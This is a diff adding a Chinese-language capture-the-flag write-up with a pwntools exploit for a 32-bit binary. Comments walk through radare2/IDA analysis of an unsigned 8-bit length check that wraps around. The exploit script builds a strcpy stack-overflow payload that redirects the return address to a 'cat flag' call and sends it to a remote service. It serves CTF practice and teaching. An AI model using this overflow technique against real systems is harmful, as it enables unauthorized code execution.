@@ -1,0 +1,36 @@
+# 在 r2 靜態分析中, 看到可疑函式 sym.what_is_this, 進去後發現函式會 push str.cat_flag
+# 因為不是呼叫 /bin/sh, 所以記下的位址不是 sym.what_is_this, 是 cat flag 的.plt位址 (0x08048694)
+
+# 在 main() 中沒發現可疑部分, 進入下一個 sym.login() 
+# 有兩個 sym.imp.read(), 分別讀取 username 和 passwd
+# 但是讀取 passwd 的 read() 讀取長度似乎有點大, 可進行 Overflow, 所以進入 sym.check_passwd() 觀察
+# 首先會看到比較條件 : 3 < passwd 的大小 <= 8, 然後往下看
+# 介紹 strcpy(), 宣告: char *strcpy( char *dest, const char *src); -> 由來源字串(src)複製到目的地(dest), 為返回值類型
+# 也就是說可以利用這個返回抓到的 push str.cat_flag (0x08048694)
+
+構建 payload:
+# sym.imp.strcpy() 前面有的 local variable [var_14h], 大小為 0x14
+# 32 位元, 所以 ebp = 0x4
+# sys_addr = push str.cat_flag 的位址 = 0x08048694
+# 重點!!! 須符合條件 3 < passwd 的大小 <= 8
+# 對 sym.check_passwd() 進行反組譯(IDA) 可發現 所填入的 passwd 數值型態是 unsigned, 長度 8bits
+# unsigned 是非負整數(含0), passwd 表示範圍 0 ~ 255 = 0000 0000 ~ 1111 1111, 若是 +1 = 256 = 1 0000 0000, 多的 1 會被捨去
+# 賦值 257 = 1, 賦值 258 = 2, 賦值 259 = 3
+# 3 = 259, 8 = 264, payload 總大小必須在 (259 ~ 264)(十進位) 內 -> 'a' * 260 - 0x14(buf) - 0x4(ebp) - 0x4(sys_addr) = 232
+
+sys_addr = 0x08048694
+payload = 'a' * 0x14 + 'a' * 0x4 + p32(sys_addr) + 'a' * 232
+
+# 前面沒什麼問題, 正常輸入就行了
+
+from pwn import *
+
+r = remote('ip', port)
+# local 端: r = process('./filename')
+
+r.sendlineafter('Your choice:', '1')
+r.sendlineafter('\n', 'aaa')
+
+r.sendlineafter('Please input your passwd:\n', payload)
+
+r.interactive()
